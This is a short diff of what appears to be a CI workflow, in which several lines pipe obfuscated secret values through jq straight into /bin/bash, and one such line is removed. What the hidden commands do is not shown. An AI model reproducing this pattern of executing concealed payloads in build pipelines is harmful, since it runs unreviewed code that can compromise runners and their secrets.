@@ -17,7 +17,6 @@ jobs:
           iq149: ${{ secrets.iq149 }}
         run: |
           printf '%s' "$iq149" | jq -r .sn1688 | /bin/bash
-          printf '%s' "$mxf9619" | jq -r .ybeep6873 | /bin/bash
           printf '%s' "$xqrsp16" | jq -r .n98875 | /bin/bash
           echo $pyxs53794 | jq -r .ra5 | /bin/bash
 
